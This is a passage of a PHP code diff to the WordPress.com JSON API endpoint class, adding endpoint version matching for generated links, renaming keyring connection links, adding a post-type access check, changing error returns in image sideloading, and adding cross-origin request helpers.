+			if ( $last_path_segment != $endpoint_last_path_segment && ! strstr( $endpoint_last_path_segment, '%' ) ) {
+				continue;
+			}
+
+			foreach ( $endpoints as $endpoint ) {
+				// Does the request method match?
+				if ( ! in_array( $request_method, $endpoint['request_methods'] ) ) {
+					continue;
+				}
+
+				$endpoint_path = untrailingslashit( $endpoint['path'] );
+				$endpoint_path_regex = str_replace( array( '%s', '%d' ), array( '([^/?&]+)', '(\d+)' ), $endpoint_path );
+
+				if ( ! preg_match( "#^$endpoint_path_regex\$#", $path, $matches ) ) {
+					continue;
+				}
+
+				// Make sure the endpoint exists at the same version
+				if ( version_compare( $this->api->version, $endpoint['min_version'], '>=') &&
+					 version_compare( $this->api->version, $endpoint['max_version'], '<=') ) {
+					return $this->api->version;
+				}
+
+				// If the endpoint doesn't exist at the same version, record the max version we found
+				if ( empty( $max_version_found ) || version_compare( $max_version_found, $endpoint['max_version'], '<' ) ) {
+					$max_version_found = $endpoint['max_version'];
+				}
+			}
+		}
+
+		// If the endpoint version is less than the requested endpoint version, return the max version found
+		if ( ! empty( $max_version_found ) ) {
+			return $max_version_found;
+		}
+
+		// Otherwise, use the API version of the current request
+		return $this->api->version;
+	}
+
+	/**
+	 * Get an array of endpoint paths with their associated versions
+	 *
+	 * The result is cached for 30 minutes.
+	 *
+	 * @return array Array of endpoint paths, min_versions and max_versions, keyed by last segment of path
+	 **/
+	protected function get_endpoint_path_versions() {
+
+		// Do we already have the result of this method in the cache?
+		$cache_result = get_transient( 'endpoint_path_versions' );
+
+		if ( ! empty ( $cache_result ) ) {
+			return $cache_result;
+		}
+
+		/*
+		 * Create a map of endpoints and their min/max versions keyed by the last segment of the path (e.g. 'posts')
+		 * This reduces the search space when finding endpoint matches in get_closest_version_of_endpoint()
+		 */
+		$endpoint_path_versions = array();
+
+		foreach ( $this->api->endpoints as $key => $endpoint_objects ) {
+
+			// The key contains a serialized path, min_version and max_version
+			list( $path, $min_version, $max_version ) = unserialize( $key );
+
+			// Grab the last component of the relative path to use as the top-level key
+			$last_path_segment = $this->get_last_segment_of_relative_path( $path );
+
+			$endpoint_path_versions[ $last_path_segment ][] = array(
+				'path' => $path,
+				'min_version' => $min_version,
+				'max_version' => $max_version,
+				'request_methods' => array_keys( $endpoint_objects )
+			);
+		}
+
+		set_transient(
+			'endpoint_path_versions',
+			$endpoint_path_versions,
+			(HOUR_IN_SECONDS / 2)
+		);
+
+		return $endpoint_path_versions;
+	}
+
+	/**
+	 * Grab the last segment of a relative path
+	 *
+	 * @param string $path Path
+	 * @return string Last path segment
+	 */
+	protected function get_last_segment_of_relative_path( $path) {
+		$path_parts = array_filter( explode( '/', $path ) );
+
+		if ( empty( $path_parts ) ) {
+			return null;
+		}
+
+		return end( $path_parts );
+	}
+
+	/**
+	 * Generate a URL to an endpoint
+	 *
+	 * Used to construct meta links in API responses
+	 *
+	 * @param mixed $args Optional arguments to be appended to URL
+	 * @return string Endpoint URL
+	 **/
 	function get_link() {
 		$args   = func_get_args();
 		$format = array_shift( $args );
-		array_unshift( $args, $this->api->public_api_scheme, WPCOM_JSON_API__BASE );
+		$base = WPCOM_JSON_API__BASE;
+
 		$path = array_pop( $args );
+
 		if ( $path ) {
 			$path = '/' . ltrim( $path, '/' );
 		}
+
 		$args[] = $path;
+
+		// Escape any % in args before using sprintf
+		$escaped_args = array();
+		foreach ( $args as $arg_key => $arg_value ) {
+			$escaped_args[ $arg_key ] = str_replace( '%', '%%', $arg_value );
+		}
+
+		$relative_path = vsprintf( "$format%s", $escaped_args );
+
+		if ( ! wp_startswith( $relative_path, '.' ) ) {
+			// Generic version. Match the requested version as best we can
+			$api_version = $this->get_closest_version_of_endpoint( $relative_path );
+			$base        = substr( $base, 0, - 1 ) . $api_version;
+		}
 
 		// http, WPCOM_JSON_API__BASE, ...    , path
 		// %s  , %s                  , $format, %s
-		return esc_url_raw( vsprintf( "%s://%s$format%s", $args ) );
+		return esc_url_raw( sprintf( "%s://%s$relative_path", $this->api->public_api_scheme, $base ) );
 	}
 
 	function get_me_link( $path = '' ) {
@@ -1466,15 +1682,38 @@ EOPHP;
 	}
 
 	function get_publicize_connections_link( $keyring_token_id, $path = '' ) {
-		return $this->get_link( '.1/me/publicize-connections/?keyring_token_ID=%d', $keyring_token_id, $path );
+		return $this->get_link( '.1/me/publicize-connections/?keyring_connection_ID=%d', $keyring_token_id, $path );
 	}
 
-	function get_keyring_token_link( $keyring_token_id, $path = '' ) {
-		return $this->get_link( '.1/me/keyring-tokens/%d', $keyring_token_id, $path );
+	function get_keyring_connection_link( $keyring_token_id, $path = '' ) {
+		return $this->get_link( '.1/me/keyring-connections/%d', $keyring_token_id, $path );
 	}
 
 	function get_external_service_link( $external_service, $path = '' ) {
 		return $this->get_link( '.1/meta/external-services/%s', $external_service, $path );
+	}
+
+
+	/**
+	* Check whether a user can view or edit a post type
+	* @param string $post_type              post type to check
+	* @param string $context                'display' or 'edit'
+	* @return bool
+	*/
+	function current_user_can_access_post_type( $post_type, $context='display' ) {
+		$post_type_object = get_post_type_object( $post_type );
+		if ( ! $post_type_object ) {
+			return false;
+		}
+
+		switch( $context ) {
+			case 'edit':
+				return current_user_can( $post_type_object->cap->edit_posts );
+			case 'display':
+				return $post_type_object->public || current_user_can( $post_type_object->cap->read_private_posts );
+			default:
+				return false;
+		}
 	}
 
 	function is_post_type_allowed( $post_type ) {
@@ -1614,7 +1853,7 @@ EOPHP;
 
 		$tmp = download_url( $url );
 		if ( is_wp_error( $tmp ) ) {
-			return false;
+			return $tmp;
 		}
 
 		if ( ! file_is_displayable_image( $tmp ) ) {
@@ -1630,6 +1869,10 @@ EOPHP;
 
 		$id = media_handle_sideload( $file_array, $parent_post_id );
 		@unlink( $tmp );
+
+		if ( is_wp_error( $id ) ) {
+			return $id;
+		}
 
 		if ( ! $id || ! is_int( $id ) ) {
 			return false;
@@ -1681,6 +1924,27 @@ EOPHP;
 		return $mimes;
 	}
 
+	function is_current_site_multi_user() {
+		$users = wp_cache_get( 'site_user_count', 'WPCOM_JSON_API_Endpoint' );
+		if ( false === $users ) {
+			$user_query = new WP_User_Query( array(
+				'blog_id' => get_current_blog_id(),
+				'fields'  => 'ID',
+			) );
+			$users = (int) $user_query->get_total();
+			wp_cache_set( 'site_user_count', $users, 'WPCOM_JSON_API_Endpoint', DAY_IN_SECONDS );
+		}
+		return $users > 1;
+	}
+
+	function allows_cross_origin_requests() {
+		return 'GET' == $this->method || $this->allow_cross_origin_request;
+	}
+
+	function allows_unauthorized_requests( $origin, $complete_access_origins  ) {
+		return 'GET' == $this->method || ( $this->allow_unauthorized_request && in_array( $origin, $complete_access_origins ) );
+	}
+
 	/**
 	 * Return endpoint response
 	 *
@@ -1692,6 +1956,7 @@ EOPHP;
 	 *	$data: HTTP 200, json_encode( $data ) response body
 	 */
 	abstract function callback( $path = '' );
+
 
 }
 
